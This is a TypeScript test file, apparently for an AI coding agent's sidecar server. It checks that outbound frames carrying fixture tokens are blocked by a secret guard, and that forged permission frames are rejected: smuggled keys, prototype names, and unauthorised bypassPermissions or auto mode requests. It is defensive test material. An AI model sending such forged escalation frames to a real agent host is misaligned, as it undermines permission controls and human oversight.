  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'allow', toolUseID: 'some-id' },
    } as never),
  )
  const err = received.find(
    f => f.kind === 'error' && f.message.includes('toolUseID'),
  )
  expect(err).toBeDefined()
})

test('F6 — an outbound event carrying a secret key is blocked, not shipped', async () => {
  // An engine event that accidentally embeds a token must never reach the client.
  const controller = new AppSessionController({
    async *runTurn() {
      // A message whose SDKMessage carries a forbidden key nested in its content.
      yield {
        type: 'assistant',
        message: { content: [{ type: 'text', text: 'ok', accessToken: 'sk-leak' }] },
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  expect(received[0]?.kind).toBe('ready') // the ready handshake is clean

  void controller.submit('go')
  await waitFor(() => received.some(f => f.kind === 'error'))

  // The event frame was blocked; an internal_error was sent in its place.
  // Asserted on the SECRET rather than on "no event frame at all", because the
  // benign `turn.status` boundary also rides this stream — checking the raw
  // bytes pins the property that actually matters and cannot be satisfied by
  // an unrelated frame simply being absent.
  expect(
    received.some(f => f.kind === 'event' && f.event.type === 'message'),
  ).toBe(false)
  const wire = JSON.stringify(received)
  expect(wire).not.toContain('sk-leak')
  expect(wire).not.toContain('accessToken')
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') {
    expect(err.code).toBe('internal_error')
    expect(err.message.toLowerCase()).toContain('credential')
  }
})

test('raw forwarding omits undefined optional SDK fields instead of dropping the event', async () => {
  const controller = new AppSessionController({
    async *runTurn() {
      yield {
        type: 'assistant',
        message: {
          id: 'msg-live',
          role: 'assistant',
          content: [{ type: 'text', text: 'live' }],
        },
        parent_tool_use_id: null,
        session_id: SESSION,
        uuid: '00000000-0000-4000-8000-000000000001',
        error: undefined,
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => received.some(frame => frame.kind === 'event'))

  const eventFrame = received.find(frame => frame.kind === 'event')
  expect(eventFrame?.kind).toBe('event')
  if (eventFrame?.kind === 'event' && eventFrame.event.type === 'message') {
    expect(eventFrame.event.message.type).toBe('assistant')
    expect('error' in eventFrame.event.message).toBe(false)
  }
})

test('F6 — a contaminated `ready` handshake is blocked (secret guard covers ready too)', () => {
  // The review flagged `ready` as a bypass path: its payload embeds session state
  // (goal snapshot, pending requests) that is a plausible accidental leak site.
  const controller = new AppSessionController(probeAdapter())
  // Contaminate the goal snapshot so it rides along in the ready payload.
  controller.updateGoalSnapshot({ threadId: 't', accessToken: 'sk-leak' } as never)
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  // No clean `ready` frame goes out; an internal_error is sent instead.
  expect(received.some(f => f.kind === 'ready')).toBe(false)
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') expect(err.message.toLowerCase()).toContain('credential')
})

test('F10 — a prototype-name type (constructor) is rejected, not crashed', () => {
  // `type in allowedByType` used to accept inherited keys and then crash on a
  // prototype function. It must be a clean bad_request now.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  expect(() =>
    server.handleData(conn, clientFrame({ type: 'constructor' } as never)),
  ).not.toThrow()
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') {
    expect(err.code).toBe('bad_request')
    expect(err.message).toContain('constructor')
  }
})

test('F10 — deny+interrupt (a host-only escalation) is rejected on permission.response', () => {
  // The Zod schema accepts `interrupt` (host field), but the renderer contract
  // does not expose it. Strict checking of `response` keys must reject it rather
  // than let it reach the engine and change deny behavior.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'deny', message: 'no', interrupt: true },
    } as never),
  )
  const err = received.find(
    f => f.kind === 'error' && f.message.includes('interrupt'),
  )
  expect(err).toBeDefined()
})

test('F10 — a legit deny still passes strict checks (reaches permission_not_found)', () => {
  // Guard against over-rejection: a contract-valid deny must NOT be flagged as an
  // unexpected-key error; with no pending request it should hit permission_not_found.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'deny', message: 'no' },
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'permission_not_found')).toBe(true)
  expect(received.some(f => f.kind === 'error' && f.message.includes('unexpected key'))).toBe(false)
})

test('F5 — ready frame does not alias the controller\'s live objects (mutation isolation)', () => {
  const controller = new AppSessionController(probeAdapter())
  const mutableSnapshot = { threadId: 'thread-123', name: 'Original Name' } as any
  controller.getGoalSnapshot = () => mutableSnapshot

  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const ready = received.find(f => f.kind === 'ready')
  expect(ready).toBeDefined()
  expect(ready?.kind).toBe('ready')

  // Mutate original object
  mutableSnapshot.name = 'Mutated Name'

  // Received frame should have original name
  expect((ready as any).payload.goalSnapshot.name).toBe('Original Name')
})

test('F5 — ready frame canonicalizes undefined-valued fields', () => {
  const controller = new AppSessionController(probeAdapter())
  controller.getGoalSnapshot = () => ({
    threadId: 'thread-123',
    description: undefined,
  } as any)

  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const ready = received.find(f => f.kind === 'ready')
  expect(ready).toBeDefined()
  const snapshotKeys = Object.keys((ready as any).payload.goalSnapshot)
  expect(snapshotKeys).not.toContain('description')
})

test('F5 — ready frame with non-JSON-safe payload is rejected', () => {
  const controller = new AppSessionController(probeAdapter())
  controller.getGoalSnapshot = () => ({
    threadId: 'thread-123',
    invalidField: new Date(),
  } as any)

  let loggedMessage = ''
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    log: (msg) => { loggedMessage = msg }
  })
  servers.push(server)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  // Ready frame should be blocked
  expect(received.some(f => f.kind === 'ready')).toBe(false)
  // An error should be logged
  expect(loggedMessage).toContain('non-plain object')
})

/** Read `updatedInput` off a possibly-null allow response without union quirks. */
function allowInput(response: AppPermissionResponse | null): unknown {
  return (response as unknown as { updatedInput?: unknown } | null)?.updatedInput
}

async function waitFor(predicate: () => boolean, timeoutMs = 2000): Promise<void> {
  const start = Date.now()
  while (!predicate()) {
    if (Date.now() - start > timeoutMs) throw new Error('waitFor timed out')
    await new Promise(r => setTimeout(r, 5))
  }
}

/* ------------------------------------------------------------------------- *
 * P2-4 — C2 `permission.setMode` + C3 `permission.context`
 * (decisions/PERMISSION-BOUNDARY.md §3/§4)
 * ------------------------------------------------------------------------- */

function contextFrames(received: ServerFrame[]): PermissionContextFrame[] {
  return received.filter(
    (frame): frame is PermissionContextFrame =>
      frame.kind === 'permission.context',
  )
}

test('C3 — attach emits a permission.context snapshot faithful to the engine context', () => {
  const store = makePermissionStore({
    mode: 'acceptEdits',
    alwaysAllowRules: { userSettings: ['Bash(date:*)'] },
    alwaysDenyRules: { projectSettings: ['WebSearch'] },
    additionalWorkingDirectories: new Map([
      ['/tmp/extra', { path: '/tmp/extra', source: 'session' }],
    ]),
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  // Ready first, snapshot immediately after (§4: attach emission; the
  // engine-owned AppReadyPayload is not widened).
  expect(received[0]?.kind).toBe('ready')
  expect(received[1]).toEqual({
    kind: 'permission.context',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    context: {
      mode: 'acceptEdits',
      alwaysAllowRules: { userSettings: ['Bash(date:*)'] },
      alwaysDenyRules: { projectSettings: ['WebSearch'] },
      alwaysAskRules: {},
      ruleMetadata: [
        {
          behavior: 'allow',
          source: 'userSettings',
          rule: 'Bash(date:*)',
          matchType: 'prefix',
        },
        {
          behavior: 'deny',
          source: 'projectSettings',
          rule: 'WebSearch',
          matchType: 'exact',
        },
      ],
      managedRulesOnly: false,
      permissionClassifierEnabled: false,
      // The engine's Map, converted to the JSON POJO entries shape.
      additionalWorkingDirectories: [{ path: '/tmp/extra', source: 'session' }],
      isBypassPermissionsModeAvailable: false,
    },
  })
})

test('C3 — no permission domain (probe fixture) → ready only, no snapshot', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received[0]?.kind).toBe('ready')
  expect(contextFrames(received)).toHaveLength(0)
})

test('C3 — a live-context change broadcasts a fresh snapshot (engine-applied rule)', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  const before = contextFrames(received).length

  // The engine's own decision path applies C1 updates via setAppState
  // (PermissionPromptToolResultSchema.ts:95-106); hooks do the same mid-turn.
  // Reproduce that exact write shape with the engine's own applyPermissionUpdate.
  store.setState(prev => ({
    ...prev,
    toolPermissionContext: applyPermissionUpdate(prev.toolPermissionContext, {
      type: 'addRules',
      rules: [{ toolName: 'Bash', ruleContent: 'date:*' }],
      behavior: 'allow',
      destination: 'session',
    }),
  }))

  const snapshots = contextFrames(received)
  expect(snapshots).toHaveLength(before + 1)
  expect(snapshots.at(-1)!.context.alwaysAllowRules.session).toContain(
    'Bash(date:*)',
  )
})

test('C3 — an unrelated app-state change does NOT re-emit the snapshot', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  const before = contextFrames(received).length

  store.setState(prev => ({ ...prev, thinkingEnabled: !prev.thinkingEnabled }))

  expect(contextFrames(received)).toHaveLength(before)
})

test('C2 — permission.setMode applies every allowlisted mode via the engine transition', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  for (const mode of ['acceptEdits', 'plan', 'dontAsk', 'default'] as const) {
    server.handleData(
      conn,
      clientFrame({ type: 'permission.setMode', requestId: `m-${mode}`, mode }),
    )
    expect(store.getState().toolPermissionContext.mode).toBe(mode)
    // The fresh snapshot IS the acknowledgement.
    expect(contextFrames(received).at(-1)!.context.mode).toBe(mode)
  }
  expect(received.some(frame => frame.kind === 'error')).toBe(false)
})

test('C2 — setMode to the CURRENT mode is a no-op and emits no snapshot', () => {
  const store = makePermissionStore({ mode: 'acceptEdits' })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = contextFrames(received).length
  const contextBefore = store.getState().toolPermissionContext

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.setMode',
      requestId: 'm-same',
      mode: 'acceptEdits',
    }),
  )

  expect(store.getState().toolPermissionContext).toBe(contextBefore)
  expect(contextFrames(received)).toHaveLength(before)
  expect(received.some(frame => frame.kind === 'error')).toBe(false)
})

test('C2 — bypassPermissions is REJECTED when the trusted launch flag is NOT set; mode unchanged, no snapshot', () => {
  // Default store → isBypassPermissionsModeAvailable false (Tool.ts:152), the
  // desktop default (no CATCODE_ALLOW_BYPASS). A renderer alone cannot escalate.
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = contextFrames(received).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'permission.setMode',
        requestId: 'm-bypass',
        mode: 'bypassPermissions',
      },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('bypassPermissions'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
  expect(contextFrames(received)).toHaveLength(before)
})

test('C2 — bypassPermissions is GRANTED when the trusted launch flag enabled it (isBypassPermissionsModeAvailable)', () => {
  // The trusted launch surface (CATCODE_ALLOW_BYPASS=1) sets availability at
  // session construction; the boundary then honours a bypass request.
  const store = makePermissionStore({ isBypassPermissionsModeAvailable: true })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'permission.setMode',
        requestId: 'm-bypass-ok',
        mode: 'bypassPermissions',
      },
    }),
  )

  // The boundary did NOT reject with the availability error, and the engine
  // applied the mode (session-scoped).
  expect(
    received.some(
      frame =>
        frame.kind === 'error' && frame.message.includes('not available'),
    ),
  ).toBe(false)
  expect(store.getState().toolPermissionContext.mode).toBe('bypassPermissions')
})

test('C2 — auto is engine-internal and REJECTED at the boundary', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'permission.setMode', requestId: 'm-auto', mode: 'auto' },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('auto'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2 — an unknown mode string fails the sidecar-local schema', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'permission.setMode', requestId: 'm-junk', mode: 'yolo' },
    }),
  )

  expect(
    received.some(frame => frame.kind === 'error' && frame.code === 'bad_request'),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2/F10 — a setMode frame smuggling a destination key is rejected wholesale', () => {
  // No destination exists on the wire — scope is pinned to `session` at the
  // sidecar. A renderer that tries to address settings persistence is refused
  // by strict-key checking before any schema runs.
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'permission.setMode',
        requestId: 'm-dest',
        mode: 'acceptEdits',
        destination: 'userSettings',
      },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('destination'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2 — setMode without a permission domain fails closed (probe fixture)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.setMode',
      requestId: 'm-nodomain',
      mode: 'acceptEdits',
    }),
  )

  expect(
    received.some(
      frame => frame.kind === 'error' && frame.code === 'internal_error',
    ),
  ).toBe(true)
})

test('C1+C3 — resolving with a suggestion selection then applying it re-snapshots', async () => {
  // End-to-end shape of the "always allow" flow at this boundary: the C1
  // selection resolves the pending request with ENGINE-minted updates attached
  // (tested exhaustively above), and when the engine's decision path applies
  // those updates to the live context, C3 broadcasts the new rule to every
  // window. The engine-side apply is reproduced with the engine's own
  // applyPermissionUpdate over the SAME store the domain watches.
  const store = makePermissionStore()
  const suggestion = bashSuggestion('date:*')
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'date' }, r => {
      resolved = r
    }, [suggestion]),
  )
  const server = makeServer(controller, createSidecarPermissionDomain(store))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )
  await waitFor(() => resolved !== null)

  const attached = (resolved as unknown as { updatedPermissions?: PermissionUpdate[] })
    .updatedPermissions
  expect(attached).toEqual([suggestion])

  // The engine applies the attached updates via setAppState
  // (PermissionPromptToolResultSchema.ts:95-106) — reproduce that write.
  for (const update of attached!) {
    store.setState(prev => ({
      ...prev,
      toolPermissionContext: applyPermissionUpdate(
        prev.toolPermissionContext,
        update,
      ),
    }))
  }

  const snapshots = contextFrames(received)
  expect(snapshots.at(-1)!.context.alwaysAllowRules.localSettings).toContain(
    'Bash(date:*)',
  )
})

/* ------------------------------------------------------------------------- *
 * P4-5 — Accounts read-seam + lifecycle-verb boundary tests
 * ------------------------------------------------------------------------- */

/** A token-BEARING pool account, to prove no credential reaches the wire. */
function acctFixture(overrides: Partial<PoolAccount> = {}): PoolAccount {
  return {
    accountId: 'acct-aaaa',
    accessToken: 'SECRET-access-should-never-leak',
    refreshToken: 'SECRET-refresh-should-never-leak',
    expiresAt: 9_999_999_999,
    source: 'vault',
    status: 'healthy',
    lastUsedAt: 1,
    vaultFilePath: '/Users/secret/.cat-code/vault/acct.json',
    alias: 'main',
    ...overrides,
  }
}

function accountFrame(message: ClientFrame['message']): Buffer {
  return encodeFrame({
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    message,
  } satisfies ClientFrame)
}

/** Flush the async `runVerb().then(send)` microtask chain. */
const flush = () => new Promise(resolve => setTimeout(resolve, 0))

function fakeExecutor(over: Partial<AccountsCommandExecutor> = {}): AccountsCommandExecutor {
  return {
    switch: () => ({ ok: true, message: 'switched' }),
    switchAnthropic: async () => ({
      ok: true,
      message: 'switched anthropic',
    }),
    rename: () => ({ ok: true, message: 'renamed' }),
    delete: () => ({ ok: true, message: 'deleted' }),
    logout: () => ({ ok: true, message: 'signed out' }),
    touchAll: async () => ({ ok: true, message: 'done', touchAllResults: [] }),
    refreshUsage: async () => false,
    ...over,
  }
}

/**
 * A FAKE OAuth runner for the boundary tests — never opens a browser / writes the
 * vault. `begin` emits `waiting_for_login` then (unless a manual code is required)
 * resolves to a pending login the alias verb persists. Deterministic + headless.
 */
function fakeOAuthRunner(
  opts: { requireManualCode?: boolean; onPasteReceived?: (code: string) => void } = {},
): OAuthLoginRunner {
  return {
    async begin({ onWaitingForLogin, waitForManualCode }) {
      onWaitingForLogin('https://auth.example/authorize?code_challenge=abc&state=xyz')
      if (opts.requireManualCode) {
        const code = await waitForManualCode()
        opts.onPasteReceived?.(code)
      }
      return {
        isExistingAccount: false,
        validateAlias: () => ({ ok: true }),
        persist: () => {},
      }
    },
  }
}

afterEach(() => {
  resetCodexAccountPoolForTest()
})

test('P4-5 — attach emits a redacted accounts.snapshot that is secretGuard-clean', () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture()], activeAccountId: 'acct-aaaa' })
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'accounts.snapshot')
  expect(snap?.kind).toBe('accounts.snapshot')
  const serialized = JSON.stringify(snap)
  expect(serialized).not.toContain('SECRET-access')
  expect(serialized).not.toContain('SECRET-refresh')
  expect(serialized).not.toContain('/Users/secret')
})

test('P4-5 — a valid account.switch produces an ok account.result and re-broadcasts the snapshot', async () => {
  seedCodexAccountPoolForTest({
    accounts: [acctFixture({ accountId: 'a', alias: 'a' }), acctFixture({ accountId: 'b', alias: 'b' })],
    activeAccountId: 'a',
  })
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const { domain: runControls } = fakeRunControlsDomain()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    accounts,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    runControls,
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'accounts.snapshot').length
  const beforeRunControls = received.filter(
    f => f.kind === 'run-controls.snapshot',
  ).length

  server.handleData(conn, accountFrame({ type: 'account.switch', requestId: 'r1', accountId: 'b' }))
  await flush()

  const result = received.find(f => f.kind === 'account.result')
  expect(result?.kind).toBe('account.result')
  expect(result && result.kind === 'account.result' && result.ok).toBe(true)
  expect(result && result.kind === 'account.result' && result.requestId).toBe('r1')
  // pool changed → a fresh snapshot was broadcast
  expect(received.filter(f => f.kind === 'accounts.snapshot').length).toBeGreaterThan(before)
  expect(
    received.filter(f => f.kind === 'run-controls.snapshot').length,
  ).toBeGreaterThan(beforeRunControls)
})

test('P4-5 — account.result never carries token material', async () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture({ accountId: 'a' })], activeAccountId: 'a' })
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, accountFrame({ type: 'account.switch', requestId: 'r', accountId: 'a' }))
  await flush()
  const result = received.find(f => f.kind === 'account.result')
  expect(JSON.stringify(result)).not.toContain('SECRET')
})

test('P4-5 — rejects an account verb carrying an unexpected key (checkStrictKeys)', () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.switch', requestId: 'r', accountId: 'a', updatedPermissions: [] } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-5 — rejects account.switch with a missing accountId (schema)', () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.switch', requestId: 'r' } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-5 — rejects account.delete without confirm:true (destructive fail-closed)', () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture({ accountId: 'a' })], activeAccountId: 'a' })
  let deleted = false
  const accounts = makeAccountsDomain({
    executor: fakeExecutor({ delete: () => { deleted = true; return { ok: true, message: 'x' } } }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  // confirm omitted
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.delete', requestId: 'r', accountId: 'a' } as unknown as ClientFrame['message'],
    }),
  )
  // confirm:false
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.delete', requestId: 'r2', accountId: 'a', confirm: false } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.filter(f => f.kind === 'error' && f.code === 'bad_request').length).toBeGreaterThanOrEqual(2)
  expect(deleted).toBe(false)
})

test('P4-5 — an account verb with no accounts domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, accountFrame({ type: 'account.logout', requestId: 'r' }))
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-15 — OAuth login sub-protocol boundary tests (progress frame + verbs)
 * ------------------------------------------------------------------------- */

test('P4-15 — account.login emits an oauth.login.progress waiting_for_login carrying the url (secretGuard-clean through send)', async () => {
  const accounts = makeAccountsDomain({ executor: fakeExecutor(), oauthRunner: fakeOAuthRunner() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, accountFrame({ type: 'account.login', requestId: 'r1' }))
  await flush()

  const ack = received.find(f => f.kind === 'account.result')
  expect(ack && ack.kind === 'account.result' && ack.ok).toBe(true)
  const progress = received.filter(f => f.kind === 'oauth.login.progress')
  const waiting = progress.find(
    f => f.kind === 'oauth.login.progress' && f.progress.state === 'waiting_for_login',
  )
  // Its arrival is itself the proof it passed send()'s secretGuard (a token-keyed
  // field would have dropped the whole frame).
  expect(waiting?.kind).toBe('oauth.login.progress')
  expect(
    waiting?.kind === 'oauth.login.progress' &&
      waiting.progress.state === 'waiting_for_login' &&
      waiting.progress.url,
  ).toBe('https://auth.example/authorize?code_challenge=abc&state=xyz')
  expect(JSON.stringify(progress)).not.toContain('SECRET')
})

test('CC-17 — account.login provider:anthropic passes the strict boundary and reaches only the Anthropic runner', async () => {
  let codexBegins = 0
  let anthropicBegins = 0
  const activated: string[] = []
  const codexRunner = fakeOAuthRunner()
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: {
      ...codexRunner,
      async begin(callbacks) {
        codexBegins++
        return codexRunner.begin(callbacks)
      },
    },
    anthropicOAuthRunner: {
      async begin({ onWaitingForLogin }) {
        anthropicBegins++
        onWaitingForLogin('https://claude.ai/oauth/authorize')
        return {
          isExistingAccount: true,
          validateAlias: () => ({ ok: true }),
          persist: () => {},
        }
      },
    },
    onProviderActivated(provider) {
      activated.push(provider)
    },
    isFirstRunEligible: () => true,
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    accountFrame({
      type: 'account.login',
      requestId: 'anthropic-login',
      provider: 'anthropic',
    }),
  )
  await flush()

  expect(codexBegins).toBe(0)
  expect(anthropicBegins).toBe(1)
  expect(activated).toEqual(['anthropic'])
  expect(
    received.some(
      frame =>
        frame.kind === 'oauth.login.progress' &&
        frame.progress.state === 'waiting_for_login' &&
        frame.progress.url === 'https://claude.ai/oauth/authorize',
    ),
  ).toBe(true)
})

test('CC-17 — account.login rejects renderer-authored provider activation authority', () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: fakeOAuthRunner(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'account.login',
        requestId: 'forged-activation',
        provider: 'anthropic',
        activateProvider: true,
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(frame => frame.kind === 'error' && frame.code === 'bad_request'),
  ).toBe(true)
})

test('CC-17 — account.login rejects an unknown provider at the strict boundary', () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: fakeOAuthRunner(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'account.login',
        requestId: 'bad-provider',
        provider: 'other',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(frame => frame.kind === 'error' && frame.code === 'bad_request'),
  ).toBe(true)
})

/*
 * CLAUDE.md §6 requires every inbound frame kind to carry a boundary test in
 * BOTH directions. These five close the gaps: `account.oauthCancel` (new, had
 * only a domain-level test that never touches the strict-key check or Zod),
 * `account.switch`'s `provider` key (the Anthropic arm crossed untested),
 * `session.branch`'s reject direction, and `app.abort`/`app.ping`, whose caps
 * had no coverage at all.
 */

test('boundary — account.oauthCancel is accepted and reaches the domain', async () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: fakeOAuthRunner(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, accountFrame({ type: 'account.login', requestId: 'l1' } as never))
  await flush()
  server.handleData(conn, accountFrame({ type: 'account.oauthCancel', requestId: 'c1' } as never))
  await flush()

  const result = received.find(
    f => f.kind === 'account.result' && f.requestId === 'c1',
  )
  expect(result?.kind).toBe('account.result')
  expect(result && result.kind === 'account.result' && result.verb).toBe(
    'account.oauthCancel',
  )
  expect(result && result.kind === 'account.result' && result.ok).toBe(true)
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('boundary — account.oauthCancel with an unexpected key is rejected (checkStrictKeys)', () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: fakeOAuthRunner(),
  })
